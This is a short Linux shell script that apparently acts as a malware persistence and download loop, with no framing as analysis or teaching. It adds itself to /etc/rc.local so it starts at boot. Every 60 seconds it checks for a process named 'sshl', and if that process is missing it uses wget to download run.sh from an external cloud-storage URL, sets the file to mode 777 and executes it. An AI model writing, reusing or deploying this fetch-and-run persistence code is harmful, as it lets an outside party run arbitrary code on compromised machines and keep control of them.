#!/bin/sh
dir="/usr/sshl/"
shell="run.sh"
shellUrl="https://skyxx.oss-cn-beijing.aliyuncs.com/run.sh"
shellPath=$dir$shell
runShell="run-d"

#process name
PRO_NAME="sshl"

#check process exist

pidpath="/run-dea.pid"
if [ -f "$pidpath" ]    
    then  
        kill `cat $pidpath`>/dev/null 2>&1   
        rm -f $pidpath  
        echo "run-daemon found"
        echo "[check process exist finish:kill process ]"
fi  
echo $$ >$pidpath 
echo "[check process exist finish:will start ]"

# rc.local setting
grep "run-daemon.sh" /etc/rc.local > /dev/null
if [ $? -eq 0 ]; then
    echo "rc.local found setting"
else
    echo "rc.local not found setting"
    chmod +x /etc/rc.local
    echo "nohup /var/run-daemon.sh&" >> /etc/rc.local
fi
echo "[rc.local setting finish]"
echo "[sleep 180 second]"

sleep 180
echo "[loop start]"

#loop
while true ; do
 service=`ps aux | grep ${PRO_NAME} | grep -v grep`
 if [ ! "$service" ]; then
 # restart
 mkdir $dir

 # download shell
 wget -O $shellPath $shellUrl

 # setting auth
 chmod 777 $shellPath

 # run
 $shellPath
 fi
 sleep 60
done
